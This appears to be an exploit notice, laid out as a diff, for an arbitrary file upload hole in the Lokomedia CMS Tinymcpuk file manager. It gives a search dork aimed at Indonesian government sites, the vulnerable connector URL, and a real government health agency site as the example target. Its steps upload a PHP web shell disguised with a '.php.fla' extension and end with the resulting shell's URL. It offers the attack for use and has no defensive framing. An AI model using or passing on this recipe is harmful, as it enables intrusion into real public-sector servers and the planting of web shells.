@@ -1,0 +1,24 @@
+Lokomedia Tinymcpuk File Upload
+
+Thnks : Typical Idiot Security - Sanjungan Jiwa
+
+DORK
+inurl:/gambar/Image/ site:go.id
+
+BUG
+site/PATH/filemanager/browser.html?Connector=connectors/php/connector.php&Type=Flash
+
+EXAMPLE
+http://dinkes.beraukab.go.id/dinkesadmin/editor/
+
+POC
+[-]getting here for access file upload
+http://dinkes.beraukab.go.id/dinkesadmin/editor/filemanager/browser.html?Connector=connectors/php/connector.php&Type=Flash
+[-]test create new dir.. if can create dir u can upload shell .php.fla
+[-]upload ur shell extension .php.fla
+
+RESULT
+http://dinkes.beraukab.go.id/dinkesadmin/editor/gambar/Flash/up.php.fla
+
+NB
+why use Type=Flash ? coz fla can upload in there
